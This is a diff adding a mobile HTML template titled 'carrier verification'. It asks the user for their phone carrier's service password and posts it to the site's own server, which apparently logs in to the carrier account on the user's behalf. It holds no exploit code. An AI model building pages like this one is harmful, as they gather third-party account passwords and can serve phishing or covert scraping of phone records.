@@ -1,0 +1,52 @@
+<!doctype html>
+<html>
+   <head>
+<style>
+* {margin: 0;padding: 0;}
+body {color: #000; background: #FFF; font-family: Verdana, Arial, sans-serif; font-size: 12px; text-align: center; font-family: "Microsoft YaHei", 微软雅黑}
+textarea, input {word-wrap: break-word; word-break: break-all; padding: 0px;}
+li {list-style-type: none;}
+.qing {clear: both; height: 0px; width: 100%; font-size: 1px; line-height: 0px; visibility: hidden; overflow: hidden;}
+.lint{ text-align: left; margin-left: 4%; margin-top: 10px; color: #999;}
+</style>
+
+<script src="__ROOT__/Public/mobile/js/jquery.min.js"></script>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui">
+<title>手机运营商验证</title>
+   </head>
+
+   <body style="background-color:#f2f2f2;">
+<form action="__URL__/index" method="post" enctype="multipart/form-data" onSubmit="return login();" id="loginForm">
+   <div style="margin-top:10px; width:100%; height:60px; background-color:#fff;">
+  <input type="number"  placeholder="请输入手机号码" maxlength="16" style="width:92%; margin:0 auto; height:40px; margin-top:10px; border:none; font-size:1.3em;"  name="mobile" id="mobile" value="{$tel_num}" readonly="readonly"/>
+   </div>
+   
+   <div style="margin-top:2px; width:100%; height:60px; background-color:#fff;">
+ <input type="password" placeholder="请输入手机服务密码" maxlength="8" style="width:92%; margin:0 auto; height:40px; margin-top:10px; border:none; font-size:1.3em;"  name="fw_password" id="fw_password" />
+   </div>
+
+     <div class="qing"></div>
+     <p class="lint">
+      提示：
+    <br/>
+      1.验证码每天发送次数有限,请您认真填写；
+    <br/>
+      2.该页面跳转需要5-20秒，请耐心等待;
+    <br/>
+      3.系统偶尔会误发送多条验证码，请您耐心等候，以最后一条验证码为准 ！由此给您带来的不便，请您谅解。
+    <br/>
+      4.登陆成功后将收到运营商通知短信，无需回复。
+     <p/>
+   </div>
+   
+
+   <div style="width:92%; height:40px; margin:0 auto; margin-top:30px;">
+     <a href="###">
+       <input type="submit" value="确定" style="width:100%; height:40px; background-color:#45b7fd; color:#fff; font-size:1.3em; border:none; border-radius:20px;"/>
+     </a> 
+   </div>
+</from>  
+</body>
+</html>
